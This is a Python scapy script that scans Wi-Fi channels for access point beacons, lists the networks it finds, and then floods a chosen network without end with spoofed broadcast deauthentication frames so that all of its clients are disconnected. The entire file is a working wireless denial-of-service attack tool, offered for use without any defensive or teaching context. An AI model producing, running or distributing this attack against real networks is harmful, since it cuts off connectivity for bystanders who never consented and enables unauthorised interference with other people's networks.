from scapy.all import *
import subprocess
import threading
import time
import sys
import os

networks = {}  
counter = 1
channel_hopping_done = False
current_channel = 1
total_channels = 14
stop_sniffing = False

def set_channel(iface, ch):
    subprocess.call(['iw', iface, 'set', 'channel', str(ch)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL)

def channel_hopper(iface):
    global current_channel, channel_hopping_done
    for idx, ch in enumerate(range(1, 15), 1):
        if channel_hopping_done:
            break
        current_channel = ch
        set_channel(iface, ch)
        print(f"\r[*] Scanning... {int((idx / total_channels) * 100)}%", end='', flush=True)
        time.sleep(1)
    channel_hopping_done = True
    print("\r[*] Scanning complete.            ")

def packet_handler(packet):
    global counter
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
        channel = None
        elt = packet[Dot11Elt]
        while isinstance(elt, Dot11Elt):
            if elt.ID == 3:
                channel = ord(elt.info)
                break
            elt = elt.payload
        if bssid not in [entry[1] for entry in networks.values()]:
            networks[counter] = (ssid, bssid, channel)
            counter += 1

def broadcast_deauth(ssid,ap_mac, iface):
    broadcast_mac = "ff:ff:ff:ff:ff:ff"
    packet = RadioTap() / Dot11(addr1=broadcast_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    print(f"[*] Starting broadcast deauth attack on SSID {ssid} via interface {iface}")
    try:
        while True:
            sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[!] Deauth attack stopped by user.")

def main(iface):
    global channel_hopping_done

    print(f"[*] Starting scan on interface: {iface}")
    hopper_thread = threading.Thread(target=channel_hopper, args=(iface,), daemon=True)
    hopper_thread.start()

    try:
        while not channel_hopping_done:
            sniff(iface=iface, prn=packet_handler, timeout=1, store=0)
    except KeyboardInterrupt:
        channel_hopping_done = True
        print("\n[!] Scanning interrupted by user.")
        time.sleep(1)

    if not networks:
        print("[!] No networks found. Exiting.")
        sys.exit(0)

    print("\nAvailable Networks:")
    for idx, (ssid, _, _) in networks.items():
        print(f"{idx}: SSID: {ssid}")

    try:
        choice = int(input("\nEnter the number of the network to deauth: "))
        if choice not in networks:
            print("[!] Invalid choice")
            sys.exit(1)
        ssid, bssid, channel = networks[choice]
        print(f"[*] Selected: SSID: {ssid}")
        set_channel(iface, channel)
        broadcast_deauth(ssid,bssid, iface)

    except ValueError:
        print("[!] Invalid input")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Exiting.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <monitor_interface>")
        sys.exit(1)

    iface = sys.argv[1]
    main(iface)
